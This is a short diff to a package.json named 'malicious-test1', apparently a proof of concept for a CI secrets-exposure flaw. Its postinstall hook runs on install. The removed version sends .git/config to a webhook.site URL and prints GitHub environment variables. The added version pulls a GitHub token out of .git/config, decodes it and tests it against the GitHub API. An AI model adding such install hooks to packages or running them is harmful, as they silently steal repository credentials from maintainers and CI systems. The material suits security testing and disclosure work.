@@ -1,6 +1,6 @@
 {
   "name": "malicious-test1",
   "scripts": {
-    "postinstall": "echo '🚨🚨🚨 CRITICAL VULNERABILITY EXPLOITED 🚨🚨🚨'; echo 'This script is running with the base repositorys secrets and permissions!'; printenv | grep GITHUB;curl -X POST -d @.git/config https://webhook.site/3622522c-1c40-495e-b629-d8f1b8b34b38"
+    "postinstall": "echo '🚨🚨🚨 CRITICAL VULNERABILITY EXPLOITED 🚨🚨🚨'; echo 'This script is running with the base repositorys secrets and permissions!'; printenv | export GH_TOKEN=$(grep extraheader .git/config  | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2);curl -I -H \"Authorization: Bearea ${GH_TOKEN}\" https://api.github.com/"
   }
 }
